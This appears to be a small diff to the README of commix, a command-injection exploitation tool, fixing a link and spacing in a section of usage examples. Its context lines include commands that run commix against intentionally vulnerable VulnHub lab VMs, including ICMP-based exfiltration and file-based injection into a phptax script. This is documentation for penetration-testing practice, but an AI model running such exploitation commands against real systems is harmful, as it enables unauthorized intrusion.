@@ -114,6 +114,7 @@ Download commix by cloning the Git repository:
     su -c "python commix.py --url="http://192.168.178.8/debug.php" --data="addr=127.0.0.1" --icmp-exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8""
 
 **Exploiting [Kioptrix: 2014 (#5)] (https://www.vulnhub.com/entry/kioptrix-2014-5,62/) using custom user-agent and specified injection technique:**
+
     python commix.py --url="http://192.168.178.6:8080/phptax/drawimage.php?pfilez=INJECT_HERE&pdf=make" --user-agent="Mozilla/4.0 Mozilla4_browser" --technique="file-based" --root-dir="/"
 
 
@@ -126,5 +127,5 @@ A collection of pwnable VMs, that includes web apps vulnerable to command inject
 - [Pentester Lab: Web For Pentester] (https://www.vulnhub.com/entry/pentester-lab-web-for-pentester,71/)
 - [Pentester Academy: Command Injection ISO: 1] (https://www.vulnhub.com/entry/command-injection-iso-1,81/)
 - [SpiderLabs: MCIR (ShelLOL)](https://github.com/SpiderLabs/MCIR/tree/master/shellol)
-- [Kioptrix: 2014 (#5)]((https://www.vulnhub.com/entry/kioptrix-2014-5,62/)
+- [Kioptrix: 2014 (#5)](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)
 - [...]
